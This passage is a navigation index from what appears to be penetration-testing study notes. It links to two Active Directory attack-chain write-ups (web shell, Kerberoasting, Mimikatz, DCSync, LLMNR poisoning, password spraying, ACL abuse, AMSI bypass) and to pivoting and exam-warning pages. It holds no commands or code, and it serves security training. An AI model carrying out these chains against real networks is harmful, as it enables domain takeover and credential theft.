- `[[skills-assessment-part1]]` — Web shell → Kerberoast → Mimikatz → DCSync chain
- `[[skills-assessment-part2]]` — LLMNR → spray → SQL → getsystem → ACL → net rpc → DCSync chain (the AMSI-pivot story)

External cross-vault:
- Pivoting: `pivoting-tunneling/00-METHODOLOGY.md` (when added) / `[[../pivoting-tunneling/05-ssh-port-forwarding]]`
- Triage by symptom: `[[../ATTACK-PATHS]]` §4 (AD by what you currently have)
- Index: `[[../SEARCH]]`
- Exam pitfalls: `[[../EXAM-WARNINGS]]`
